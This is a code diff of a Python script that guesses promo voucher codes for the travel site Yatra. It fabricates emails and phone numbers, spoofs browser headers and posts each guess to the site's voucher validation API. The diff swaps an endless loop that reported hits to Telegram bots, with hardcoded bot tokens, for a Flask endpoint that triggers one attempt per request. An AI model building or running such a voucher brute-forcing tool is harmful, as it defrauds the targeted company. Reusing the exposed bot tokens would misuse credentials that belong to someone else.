@@ -1,8 +1,11 @@
+from flask import Flask
 import random
 import requests
 import json
 import time
+import os
 
+app = Flask(__name__)
 
 def generate_code():
     """Generate a random code in the exact format Y2GTV?m?m?m?m?m?m?m?m?m?m."""
@@ -32,20 +35,9 @@ def make_post_request(code, email, phone):
     # Custom headers
     headers = {
         "accept": "application/json, text/javascript, */*; q=0.01",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.9",
         "content-type": "application/json",
-        "origin": "https://secure.yatra.com",
-        "referer": "https://secure.yatra.com/PaySwift/payment",
-        "sec-ch-ua": '"-Not.A/Brand";v="8", "Chromium";v="102"',
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin",
         "user-agent":
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
-        "x-requested-with": "XMLHttpRequest",
     }
 
     # Payload
@@ -58,7 +50,11 @@ def make_post_request(code, email, phone):
         "mobile": phone,
         "source": "YT",
         "context": "REVIEW",
-        "vouchers": [{"code": code, "type": "PROMO", "pin": ""}],
+        "vouchers": [{
+            "code": code,
+            "type": "PROMO",
+            "pin": ""
+        }]
     }
 
     try:
@@ -70,57 +66,32 @@ def make_post_request(code, email, phone):
         return None
 
 
-def send_to_telegram(api_url, message):
-    """Send a message to Telegram using the specified API."""
-    telegram_url = f"{api_url}&text={message}"
-    try:
-        response = requests.get(telegram_url)
-        response.raise_for_status()
-        print(f"Notification sent to Telegram: {message}")
-    except requests.RequestException as e:
-        print(f"Error sending notification to Telegram: {e}")
+@app.route('/')
+def home():
+    """Simple status endpoint."""
+    return "Service is running!"
 
 
-def main():
-    """Generate and validate voucher codes continuously."""
-    valid_code_api = "https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246"
-    invalid_code_api = "https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395"
+@app.route('/run', methods=['GET'])
+def run_task():
+    """Endpoint to trigger voucher validation."""
+    code = generate_code()
+    email = generate_email()
+    phone = generate_phone()
 
-    while True:
-        code = generate_code()
-        email = generate_email()
-        phone = generate_phone()
+    print(f"Generated code: {code}")
+    print(f"Generated email: {email}")
+    print(f"Generated phone: {phone}")
 
-        print(f"Generated code: {code}")
-        print(f"Generated email: {email}")
-        print(f"Generated phone: {phone}")
+    response = make_post_request(code, email, phone)
 
-        response = make_post_request(code, email, phone)
-
-        if response:
-            print(f"API Response: {json.dumps(response, indent=2)}")
-            if response.get("resMsg") == "Successfully validated":
-                redeemed_balance = response["vouchers"][0]["redeemedBalance"]
-                total_balance = response["vouchers"][0]["totalBalance"]
-
-                message = (f"Code validated successfully:\n"
-                           f"Code: {code}\n"
-                           f"Redeemed Balance: {redeemed_balance}\n"
-                           f"Total Balance: {total_balance}")
-                print(message)
-                send_to_telegram(valid_code_api, message)
-            else:
-                error_message = (
-                    f"Validation failed for code: {code}. Response message: {response.get('resMsg', 'Unknown error')}."
-                )
-                print(error_message)
-                send_to_telegram(invalid_code_api, error_message)
-        else:
-            print("No valid response received or request failed.")
-            send_to_telegram(invalid_code_api, "Request failed, no valid response.")
-
-        time.sleep(20)  # Delay between iterations to avoid excessive load
+    if response:
+        print(f"API Response: {json.dumps(response, indent=2)}")
+        return response
+    else:
+        return {"error": "Request failed or no valid response received."}
 
 
 if __name__ == "__main__":
-    main()
+    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no port is specified
+    app.run(host="0.0.0.0", port=port)
